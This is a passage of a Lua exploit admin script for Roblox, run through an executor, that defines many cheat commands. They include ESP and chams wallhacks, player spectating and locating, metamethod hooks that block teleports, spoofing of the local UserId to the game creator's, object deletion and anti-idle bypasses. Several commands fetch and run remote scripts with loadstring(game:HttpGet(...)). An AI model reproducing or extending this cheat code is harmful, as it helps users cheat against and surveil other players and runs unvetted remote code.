		addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
			if not hookmetamethod then 
				return notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
			end
			local TeleportService = TeleportService
			local oldhmmi
			local oldhmmnc
			oldhmmi = hookmetamethod(game, "__index", function(self, method)
				if self == TeleportService then
					if method:lower() == "teleport" then
						return error("Expected ':' not '.' calling member function Kick", 2)
					elseif method == "TeleportToPlaceInstance" then
						return error("Expected ':' not '.' calling member function TeleportToPlaceInstance", 2)
					end
				end
				return oldhmmi(self, method)
			end)
			oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
				if self == TeleportService and getnamecallmethod():lower() == "teleport" or getnamecallmethod() == "TeleportToPlaceInstance" then
					return
				end
				return oldhmmnc(self, ...)
			end)
	
			notify('Client AntiTP','Client anti teleport is now active (only effective on localscript teleport)')
		end)
	
		addcmd('allowrejoin',{'allowrj'},function(args, speaker)
			if args[1] and args[1] == 'false' then
				allow_rj = false
				notify('Client AntiTP','Allow rejoin set to false')
			else
				allow_rj = true
				notify('Client AntiTP','Allow rejoin set to true')
			end
		end)
	
		addcmd("cancelteleport", {"canceltp"}, function(args, speaker)
			TeleportService:TeleportCancel()
		end)
	
		addcmd("volume",{ "vol"}, function(args, speaker)
			UserSettings():GetService("UserGameSettings").MasterVolume = args[1]/10
		end)
	
		addcmd("antilag", {"boostfps", "lowgraphics"}, function(args, speaker)
			local Terrain = workspace:FindFirstChildWhichIsA("Terrain")
			Terrain.WaterWaveSize = 0
			Terrain.WaterWaveSpeed = 0
			Terrain.WaterReflectance = 0
			Terrain.WaterTransparency = 1
			Lighting.GlobalShadows = false
			Lighting.FogEnd = 9e9
			Lighting.FogStart = 9e9
			settings().Rendering.QualityLevel = 1
			for _, v in pairs(game:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CastShadow = false
					v.Material = "Plastic"
					v.Reflectance = 0
					v.BackSurface = "SmoothNoOutlines"
					v.BottomSurface = "SmoothNoOutlines"
					v.FrontSurface = "SmoothNoOutlines"
					v.LeftSurface = "SmoothNoOutlines"
					v.RightSurface = "SmoothNoOutlines"
					v.TopSurface = "SmoothNoOutlines"
				elseif v:IsA("Decal") then
					v.Transparency = 1
					v.Texture = ""
				elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
					v.Lifetime = NumberRange.new(0)
				end
			end
			for _, v in pairs(Lighting:GetDescendants()) do
				if v:IsA("PostEffect") then
					v.Enabled = false
				end
			end
			workspace.DescendantAdded:Connect(function(child)
				task.spawn(function()
					if child:IsA("ForceField") or child:IsA("Sparkles") or child:IsA("Smoke") or child:IsA("Fire") or child:IsA("Beam") then
						RunService.Heartbeat:Wait()
						child:Destroy()
					elseif child:IsA("BasePart") then
						child.CastShadow = false
					end
				end)
			end)
		end)
	
		addcmd("setfpscap", {"fpscap", "maxfps"}, function(args, speaker)
			if fpscaploop then
				task.cancel(fpscaploop)
				fpscaploop = nil
			end
	
			local fpsCap = 60
			local num = tonumber(args[1]) or 1e6
			if num == "none" then
				return
			elseif num > 0 then
				fpsCap = num
			else
				return notify("Invalid argument", "Please provide a number above 0 or 'none'.")
			end
	
			if setfpscap and type(setfpscap) == "function" then
				setfpscap(fpsCap)
			else
				fpscaploop = task.spawn(function()
					local timer = os.clock()
					while true do
						if os.clock() >= timer + 1 / fpsCap then
							timer = os.clock()
							task.wait()
						end
					end
				end)
			end
		end)
	
		addcmd('notify',{},function(args, speaker)
			notify(getstring(1))
		end)
	
		addcmd('lastcommand',{'lastcmd'},function(args, speaker)
			if cmdHistory[1]:sub(1,11) ~= 'lastcommand' and cmdHistory[1]:sub(1,7) ~= 'lastcmd' then
				execCmd(cmdHistory[1])
			end
		end)
	
		addcmd('esp',{},function(args, speaker)
			if not CHMSenabled then
				ESPenabled = true
				for i,v in pairs(Players:GetPlayers()) do
					if v.Name ~= speaker.Name then
						ESP(v)
					end
				end
			else
				notify('ESP','Disable chams (nochams) before using esp')
			end
		end)
	
		addcmd('espteam',{},function(args, speaker)
			if not CHMSenabled then
				ESPenabled = true
				for i,v in pairs(Players:GetPlayers()) do
					if v.Name ~= speaker.Name then
						ESP(v, true)
					end
				end
			else
				notify('ESP','Disable chams (nochams) before using esp')
			end
		end)
	
		addcmd('noesp',{'unesp','unespteam'},function(args, speaker)
			ESPenabled = false
			for i,c in pairs(COREGUI:GetChildren()) do
				if string.sub(c.Name, -4) == '_ESP' then
					c:Destroy()
				end
			end
		end)
	
		addcmd('esptransparency',{},function(args, speaker)
			espTransparency = (args[1] and isNumber(args[1]) and args[1]) or 0.3
			updatesaves()
		end)
	
		local espParts = {}
		local partEspTrigger = nil
		function partAdded(part)
			if #espParts > 0 then
				if FindInTable(espParts,part.Name:lower()) then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = part.Name:lower().."_PESP"
					a.Parent = part
					a.Adornee = part
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = part.Size
					a.Transparency = espTransparency
					a.Color = BrickColor.new("Lime green")
				end
			else
				partEspTrigger:Disconnect()
				partEspTrigger = nil
			end
		end
	
		addcmd('partesp',{},function(args, speaker)
			local partEspName = getstring(1):lower()
			if not FindInTable(espParts,partEspName) then
				table.insert(espParts,partEspName)
				for i,v in pairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") and v.Name:lower() == partEspName then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = partEspName.."_PESP"
						a.Parent = v
						a.Adornee = v
						a.AlwaysOnTop = true
						a.ZIndex = 0
						a.Size = v.Size
						a.Transparency = espTransparency
						a.Color = BrickColor.new("Lime green")
					end
				end
			end
			if partEspTrigger == nil then
				partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
			end
		end)
	
		addcmd('unpartesp',{'nopartesp'},function(args, speaker)
			if args[1] then
				local partEspName = getstring(1):lower()
				if FindInTable(espParts,partEspName) then
					table.remove(espParts, GetInTable(espParts, partEspName))
				end
				for i,v in pairs(workspace:GetDescendants()) do
					if v:IsA("BoxHandleAdornment") and v.Name == partEspName..'_PESP' then
						v:Destroy()
					end
				end
			else
				partEspTrigger:Disconnect()
				partEspTrigger = nil
				espParts = {}
				for i,v in pairs(workspace:GetDescendants()) do
					if v:IsA("BoxHandleAdornment") and v.Name:sub(-5) == '_PESP' then
						v:Destroy()
					end
				end
			end
		end)
	
		addcmd('chams',{},function(args, speaker)
			if not ESPenabled then
				CHMSenabled = true
				for i,v in pairs(Players:GetPlayers()) do
					if v.Name ~= speaker.Name then
						CHMS(v)
					end
				end
			else
				notify('Chams','Disable ESP (noesp) before using chams')
			end
		end)
	
		addcmd('nochams',{'unchams'},function(args, speaker)
			CHMSenabled = false
			for i,v in pairs(Players:GetPlayers()) do
				local chmsplr = v
				for i,c in pairs(COREGUI:GetChildren()) do
					if c.Name == chmsplr.Name..'_CHMS' then
						c:Destroy()
					end
				end
			end
		end)
	
		addcmd('locate',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				Locate(Players[v])
			end
		end)
	
		addcmd('nolocate',{'unlocate'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			if args[1] then
				for i,v in pairs(players) do
					for i,c in pairs(COREGUI:GetChildren()) do
						if c.Name == Players[v].Name..'_LC' then
							c:Destroy()
						end
					end
				end
			else
				for i,c in pairs(COREGUI:GetChildren()) do
					if string.sub(c.Name, -3) == '_LC' then
						c:Destroy()
					end
				end
			end
		end)
	
		viewing = nil
		addcmd('view',{'spectate'},function(args, speaker)
			StopFreecam()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				if viewDied then
					viewDied:Disconnect()
					viewChanged:Disconnect()
				end
				viewing = Players[v]
				workspace.CurrentCamera.CameraSubject = viewing.Character
				notify('Spectate','Viewing ' .. Players[v].Name)
				local function viewDiedFunc()
					repeat wait() until Players[v].Character ~= nil and getRoot(Players[v].Character)
					workspace.CurrentCamera.CameraSubject = viewing.Character
				end
				viewDied = Players[v].CharacterAdded:Connect(viewDiedFunc)
				local function viewChangedFunc()
					workspace.CurrentCamera.CameraSubject = viewing.Character
				end
				viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
			end
		end)
	
		addcmd('viewpart',{'viewp'},function(args, speaker)
			StopFreecam()
			if args[1] then
				for i,v in pairs(workspace:GetDescendants()) do
					if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
						wait(0.1)
						workspace.CurrentCamera.CameraSubject = v
					end
				end
			end
		end)
	
		addcmd('unview',{'unspectate'},function(args, speaker)
			StopFreecam()
			if viewing ~= nil then
				viewing = nil
				notify('Spectate','View turned off')
			end
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			workspace.CurrentCamera.CameraSubject = speaker.Character
		end)
	
	
		fcRunning = false
		local Camera = workspace.CurrentCamera
		workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
			local newCamera = workspace.CurrentCamera
			if newCamera then
				Camera = newCamera
			end
		end)
	
		local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
	
		Spring = {} do
			Spring.__index = Spring
	
			function Spring.new(freq, pos)
				local self = setmetatable({}, Spring)
				self.f = freq
				self.p = pos
				self.v = pos*0
				return self
			end
	
			function Spring:Update(dt, goal)
				local f = self.f*2*math.pi
				local p0 = self.p
				local v0 = self.v
	
				local offset = goal - p0
				local decay = math.exp(-f*dt)
	
				local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
				local v1 = (f*dt*(offset*f - v0) + v0)*decay
	
				self.p = p1
				self.v = v1
	
				return p1
			end
	
			function Spring:Reset(pos)
				self.p = pos
				self.v = pos*0
			end
		end
	
		local cameraPos = Vector3.new()
		local cameraRot = Vector2.new()
	
		local velSpring = Spring.new(5, Vector3.new())
		local panSpring = Spring.new(5, Vector2.new())
	
		Input = {} do
	
			keyboard = {
				W = 0,
				A = 0,
				S = 0,
				D = 0,
				E = 0,
				Q = 0,
				Up = 0,
				Down = 0,
				LeftShift = 0,
			}
	
			mouse = {
				Delta = Vector2.new(),
			}
	
			NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
			PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
			NAV_ADJ_SPEED = 0.75
			NAV_SHIFT_MUL = 0.25
	
			navSpeed = 1
	
			function Input.Vel(dt)
				navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)
	
				local kKeyboard = Vector3.new(
					keyboard.D - keyboard.A,
					keyboard.E - keyboard.Q,
					keyboard.S - keyboard.W
				)*NAV_KEYBOARD_SPEED
	
				local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)
	
				return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
			end
	
			function Input.Pan(dt)
				local kMouse = mouse.Delta*PAN_MOUSE_SPEED
				mouse.Delta = Vector2.new()
				return kMouse
			end
	
			do
				function Keypress(action, state, input)
					keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
					return Enum.ContextActionResult.Sink
				end
	
				function MousePan(action, state, input)
					local delta = input.Delta
					mouse.Delta = Vector2.new(-delta.y, -delta.x)
					return Enum.ContextActionResult.Sink
				end
	
				function Zero(t)
					for k, v in pairs(t) do
						t[k] = v*0
					end
				end
	
				function Input.StartCapture()
					ContextActionService:BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
						Enum.KeyCode.W,
						Enum.KeyCode.A,
						Enum.KeyCode.S,
						Enum.KeyCode.D,
						Enum.KeyCode.E,
						Enum.KeyCode.Q,
						Enum.KeyCode.Up,
						Enum.KeyCode.Down
					)
					ContextActionService:BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
				end
	
				function Input.StopCapture()
					navSpeed = 1
					Zero(keyboard)
					Zero(mouse)
					ContextActionService:UnbindAction("FreecamKeyboard")
					ContextActionService:UnbindAction("FreecamMousePan")
				end
			end
		end
	
		function GetFocusDistance(cameraFrame)
			local znear = 0.1
			local viewport = Camera.ViewportSize
			local projy = 2*math.tan(cameraFov/2)
			local projx = viewport.x/viewport.y*projy
			local fx = cameraFrame.rightVector
			local fy = cameraFrame.upVector
			local fz = cameraFrame.lookVector
	
			local minVect = Vector3.new()
			local minDist = 512
	
			for x = 0, 1, 0.5 do
				for y = 0, 1, 0.5 do
					local cx = (x - 0.5)*projx
					local cy = (y - 0.5)*projy
					local offset = fx*cx - fy*cy + fz
					local origin = cameraFrame.p + offset*znear
					local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
					local dist = (hit - origin).magnitude
					if minDist > dist then
						minDist = dist
						minVect = offset.unit
					end
				end
			end
	
			return fz:Dot(minVect)*minDist
		end
	
		local function StepFreecam(dt)
			local vel = velSpring:Update(dt, Input.Vel(dt))
			local pan = panSpring:Update(dt, Input.Pan(dt))
	
			local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))
	
			cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
			cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))
	
			local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
			cameraPos = cameraCFrame.p
	
			Camera.CFrame = cameraCFrame
			Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
			Camera.FieldOfView = cameraFov
		end
	
		local PlayerState = {} do
			mouseBehavior = ""
			mouseIconEnabled = ""
			cameraType = ""
			cameraFocus = ""
			cameraCFrame = ""
			cameraFieldOfView = ""
	
			function PlayerState.Push()
				cameraFieldOfView = Camera.FieldOfView
				Camera.FieldOfView = 70
	
				cameraType = Camera.CameraType
				Camera.CameraType = Enum.CameraType.Custom
	
				cameraCFrame = Camera.CFrame
				cameraFocus = Camera.Focus
	
				mouseIconEnabled = UserInputService.MouseIconEnabled
				UserInputService.MouseIconEnabled = true
	
				mouseBehavior = UserInputService.MouseBehavior
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			end
	
			function PlayerState.Pop()
				Camera.FieldOfView = 70
	
				Camera.CameraType = cameraType
				cameraType = nil
	
				Camera.CFrame = cameraCFrame
				cameraCFrame = nil
	
				Camera.Focus = cameraFocus
				cameraFocus = nil
	
				UserInputService.MouseIconEnabled = mouseIconEnabled
				mouseIconEnabled = nil
	
				UserInputService.MouseBehavior = mouseBehavior
				mouseBehavior = nil
			end
		end
	
		function StartFreecam(pos)
			if fcRunning then
				StopFreecam()
			end
			local cameraCFrame = Camera.CFrame
			if pos then
				cameraCFrame = pos
			end
			cameraRot = Vector2.new()
			cameraPos = cameraCFrame.p
			cameraFov = Camera.FieldOfView
	
			velSpring:Reset(Vector3.new())
			panSpring:Reset(Vector2.new())
	
			PlayerState.Push()
			RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
			Input.StartCapture()
			fcRunning = true
		end
	
		function StopFreecam()
			if not fcRunning then return end
			Input.StopCapture()
			RunService:UnbindFromRenderStep("Freecam")
			PlayerState.Pop()
			workspace.Camera.FieldOfView = 70
			fcRunning = false
		end
	
		addcmd('freecam',{'fc'},function(args, speaker)
			StartFreecam()
		end)
	
		addcmd('freecampos',{'fcpos','fcp','freecamposition','fcposition'},function(args, speaker)
			if not args[1] then return end
			local freecamPos = CFrame.new(args[1],args[2],args[3])
			StartFreecam(freecamPos)
		end)
	
		addcmd('freecamwaypoint',{'fcwp'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if speaker.Character then
				for i,_ in pairs(WayPoints) do
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
						StartFreecam(CFrame.new(x,y,z))
					end
				end
				for i,_ in pairs(pWayPoints) do
					if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
						StartFreecam(CFrame.new(pWayPoints[i].COORD[1].Position))
					end
				end
			end
		end)
	
		addcmd('freecamgoto',{'fcgoto','freecamtp','fctp'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				StartFreecam(getRoot(Players[v].Character).CFrame)
			end
		end)
	
		addcmd('unfreecam',{'nofreecam','unfc','nofc'},function(args, speaker)
			StopFreecam()
		end)
	
		addcmd('freecamspeed',{'fcspeed'},function(args, speaker)
			local FCspeed = args[1] or 1
			if isNumber(FCspeed) then
				NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
			end
		end)
	
		addcmd('notifyfreecamposition',{'notifyfcpos'},function(args, speaker)
			if fcRunning then
				local X,Y,Z = workspace.CurrentCamera.CFrame.Position.X,workspace.CurrentCamera.CFrame.Position.Y,workspace.CurrentCamera.CFrame.Position.Z
				local Format, Round = string.format, math.round
				notify("Current Position", Format("%s, %s, %s", Round(X), Round(Y), Round(Z)))
			end
		end)
	
		addcmd('copyfreecamposition',{'copyfcpos'},function(args, speaker)
			if fcRunning then
				local X,Y,Z = workspace.CurrentCamera.CFrame.Position.X,workspace.CurrentCamera.CFrame.Position.Y,workspace.CurrentCamera.CFrame.Position.Z
				local Format, Round = string.format, math.round
				toClipboard(Format("%s, %s, %s", Round(X), Round(Y), Round(Z)))
			end
		end)
	
		addcmd('gotocamera',{'gotocam','tocam'},function(args, speaker)
			getRoot(speaker.Character).CFrame = workspace.Camera.CFrame
		end)
	
		addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
			TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame}):Play()
		end)
	
		addcmd('fov',{},function(args, speaker)
			local fov = args[1] or 70
			if isNumber(fov) then
				workspace.CurrentCamera.FieldOfView = fov
			end
		end)
	
		local preMaxZoom = Players.LocalPlayer.CameraMaxZoomDistance
		local preMinZoom = Players.LocalPlayer.CameraMinZoomDistance
		addcmd('lookat',{},function(args, speaker)
			if speaker.CameraMaxZoomDistance ~= 0.5 then
				preMaxZoom = speaker.CameraMaxZoomDistance
				preMinZoom = speaker.CameraMinZoomDistance
			end
			speaker.CameraMaxZoomDistance = 0.5
			speaker.CameraMinZoomDistance = 0.5
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local target = Players[v].Character
				if target and target:FindFirstChild('Head') then
					workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, target.Head.CFrame.p)
					wait(0.1)
				end
			end
			speaker.CameraMaxZoomDistance = preMaxZoom
			speaker.CameraMinZoomDistance = preMinZoom
		end)
	
		addcmd('fixcam',{'restorecam'},function(args, speaker)
			StopFreecam()
			execCmd('unview')
			workspace.CurrentCamera:remove()
			wait(.1)
			repeat wait() until speaker.Character ~= nil
			workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
			workspace.CurrentCamera.CameraType = "Custom"
			speaker.CameraMinZoomDistance = 0.5
			speaker.CameraMaxZoomDistance = 400
			speaker.CameraMode = "Classic"
			speaker.Character.Head.Anchored = false
		end)
	
		addcmd("enableshiftlock", {"enablesl", "shiftlock"}, function(args, speaker)
			local function enableShiftlock() 
				speaker.DevEnableMouseLock = true 
			end
			speaker:GetPropertyChangedSignal("DevEnableMouseLock"):Connect(enableShiftlock)
			enableShiftlock()
			notify("Shiftlock", "Shift lock should now be available")
		end)
	
		addcmd('firstp',{},function(args, speaker)
			speaker.CameraMode = "LockFirstPerson"
		end)
	
		addcmd('thirdp',{},function(args, speaker)
			speaker.CameraMode = "Classic"
		end)
	
		addcmd('noclipcam', {'nccam'}, function(args, speaker)
			local sc = (debug and debug.setconstant) or setconstant
			local gc = (debug and debug.getconstants) or getconstants
			if not sc or not getgc or not gc then
				return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
			end
			local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
			for _, v in pairs(getgc()) do
				if type(v) == 'function' and getfenv(v).script == pop then
					for i, v1 in pairs(gc(v)) do
						if tonumber(v1) == .25 then
							sc(v, i, 0)
						elseif tonumber(v1) == 0 then
							sc(v, i, .25)
						end
					end
				end
			end
		end)
	
		addcmd('maxzoom',{},function(args, speaker)
			speaker.CameraMaxZoomDistance = args[1]
		end)
	
		addcmd('minzoom',{},function(args, speaker)
			speaker.CameraMinZoomDistance = args[1]
		end)
	
		addcmd('camdistance',{},function(args, speaker)
			local camMax = speaker.CameraMaxZoomDistance
			local camMin = speaker.CameraMinZoomDistance
			if camMax < tonumber(args[1]) then
				camMax = args[1]
			end
			speaker.CameraMaxZoomDistance = args[1]
			speaker.CameraMinZoomDistance = args[1]
			wait()
			speaker.CameraMaxZoomDistance = camMax
			speaker.CameraMinZoomDistance = camMin
		end)
	
		addcmd('unlockws',{'unlockworkspace'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Locked = false
				end
			end
		end)
	
		addcmd('lockws',{'lockworkspace'},function(args, speaker) 
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Locked = true
				end
			end
		end)
	
		addcmd('delete',{'remove'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() then
					v:Destroy()
				end
			end
			notify('Item(s) Deleted','Deleted ' ..getstring(1))
		end)
	
		addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.ClassName:lower() == getstring(1):lower() then
					v:Destroy()
				end
			end
			notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
		end)
	
		addcmd('chardelete',{'charremove','cd'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() then
					v:Destroy()
				end
			end
			notify('Item(s) Deleted','Deleted ' ..getstring(1))
		end)
	
		addcmd('chardeleteclass',{'charremoveclass','chardeleteclassname','charremoveclassname','cdc'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v.ClassName:lower() == getstring(1):lower() then
					v:Destroy()
				end
			end
			notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
		end)
	
		addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
					v:Destroy()
				end
			end
		end)
	
		addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
					v:Destroy()
				end
			end
		end)
	
		local shownParts = {}
		addcmd('invisibleparts',{'invisparts'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Transparency == 1 then
					if not table.find(shownParts,v) then
						table.insert(shownParts,v)
					end
					v.Transparency = 0
				end
			end
		end)
	
		addcmd('uninvisibleparts',{'uninvisparts'},function(args, speaker)
			for i,v in pairs(shownParts) do
				v.Transparency = 1
			end
			shownParts = {}
		end)
	
		addcmd('btools',{},function(args, speaker)
			for i = 1, 4 do
				local Tool = Instance.new("HopperBin")
				Tool.BinType = i
				Tool.Name = randomString()
				Tool.Parent = speaker:FindFirstChildOfClass("Backpack")
			end
		end)
	
		addcmd('f3x',{'fex'},function(args, speaker)
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
		end)
	
		addcmd('partpath',{'partname'},function(args, speaker)
			selectPart()
		end)
	
		addcmd('antiafk',{'antiidle'},function(args, speaker)
			local GC = getconnections or get_signal_cons
			if GC then
				for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
					if v["Disable"] then
						v["Disable"](v)
					elseif v["Disconnect"] then
						v["Disconnect"](v)
					end
				end
			else
				local VirtualUser = cloneref(game:GetService("VirtualUser"))
				Players.LocalPlayer.Idled:Connect(function()
					VirtualUser:CaptureController()
					VirtualUser:ClickButton2(Vector2.new())
				end)
			end
			if not (args[1] and tostring(args[1]) == 'nonotify') then notify('Anti Idle','Anti idle is enabled') end
		end)
	
		addcmd("datalimit", {}, function(args, speaker)
			local kbps = tonumber(args[1])
			if kbps then
				local NetworkClient = cloneref(game:GetService("NetworkClient"))
				NetworkClient:SetOutgoingKBPSLimit(kbps)
			end
		end)
	
		addcmd("replicationlag", {"backtrack"}, function(args, speaker)
			if tonumber(args[1]) then
				settings():GetService("NetworkSettings").IncomingReplicationLag = args[1]
			end
		end)
	
		addcmd("noprompts", {"nopurchaseprompts"}, function(args, speaker)
			COREGUI.PurchasePromptApp.Enabled = false
		end)
	
		addcmd("showprompts", {"showpurchaseprompts"}, function(args, speaker)
			COREGUI.PurchasePromptApp.Enabled = true
		end)
	
		promptNewRig = function(speaker, rig)
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			if humanoid then
				AvatarEditorService:PromptSaveAvatar(humanoid.HumanoidDescription, Enum.HumanoidRigType[rig])
				local result = AvatarEditorService.PromptSaveAvatarCompleted:Wait()
				if result == Enum.AvatarPromptResult.Success then
					execCmd("reset")
				end
			end
		end
	
		addcmd("promptr6", {}, function(args, speaker)
			promptNewRig(speaker, "R6")
		end)
	
		addcmd("promptr15", {}, function(args, speaker)
			promptNewRig(speaker, "R15")
		end)
	
		addcmd("wallwalk", {"walkonwalls"}, function(args, speaker)
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
		end)
	
		addcmd('age',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local ages = {}
			for i,v in pairs(players) do
				local p = Players[v]
				table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
			end
			notify('Account Age',table.concat(ages, ',\n'))
		end)
	
		addcmd('chatage',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local ages = {}
			for i,v in pairs(players) do
				local p = Players[v]
				table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
			end
			local chatString = table.concat(ages, ', ')
			chatMessage(chatString)
		end)
	
		addcmd('joindate',{'jd'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local dates = {}
			for i,v in pairs(players) do
				local p = Players[v]
	
				local secondsOld = p.AccountAge * 24 * 60 * 60
				local now = os.time()
				local dateJoined  = p.Name .. " joined: " .. os.date("%m/%d/%y", now - secondsOld)
	
				table.insert(dates, dateJoined)
			end
			notify('Join Date (Month/Day/Year)',table.concat(dates, ',\n'))
		end)
	
		addcmd('chatjoindate',{'cjd'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local dates = {}
			for i,v in pairs(players) do
				local p = Players[v]
	
				local secondsOld = p.AccountAge * 24 * 60 * 60
				local now = os.time()
				local dateJoined  = p.Name .. " joined: " .. os.date("%m/%d/%y", now - secondsOld)
	
				table.insert(dates, dateJoined)
			end
			local chatString = table.concat(dates, ', ')
			chatMessage(chatString)
		end)
	
		addcmd('copyname',{'copyuser'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local name = tostring(Players[v].Name)
				toClipboard(name)
			end
		end)
	
		addcmd('userid',{'id'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local id = tostring(Players[v].UserId)
				notify('User ID',id)
			end
		end)
	
		addcmd("copyplaceid", {"placeid"}, function(args, speaker)
			toClipboard(PlaceId)
		end)
	
		addcmd("copygameid", {"gameid"}, function(args, speaker)
			toClipboard(game.GameId)
		end)
	
		addcmd('copyid',{'copyuserid'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local id = tostring(Players[v].UserId)
				toClipboard(id)
			end
		end)
	
		addcmd('creatorid',{'creator'},function(args, speaker)
			if game.CreatorType == Enum.CreatorType.User then
				notify('Creator ID',game.CreatorId)
			elseif game.CreatorType == Enum.CreatorType.Group then
				local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
				speaker.UserId = OwnerID
				notify('Creator ID',OwnerID)
			end
		end)
	
		addcmd('copycreatorid',{'copycreator'},function(args, speaker)
			if game.CreatorType == Enum.CreatorType.User then
				toClipboard(game.CreatorId)
				notify('Copied ID','Copied creator ID to clipboard')
			elseif game.CreatorType == Enum.CreatorType.Group then
				local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
				toClipboard(OwnerID)
				notify('Copied ID','Copied creator ID to clipboard')
			end
		end)
	
		addcmd('setcreatorid',{'setcreator'},function(args, speaker)
			if game.CreatorType == Enum.CreatorType.User then
				speaker.UserId = game.CreatorId
				notify('Set ID','Set UserId to '..game.CreatorId)
			elseif game.CreatorType == Enum.CreatorType.Group then
				local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
				speaker.UserId = OwnerID
				notify('Set ID','Set UserId to '..OwnerID)
			end
		end)
	
		addcmd('appearanceid',{'aid'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local aid = tostring(Players[v].CharacterAppearanceId)
				notify('Appearance ID',aid)
			end
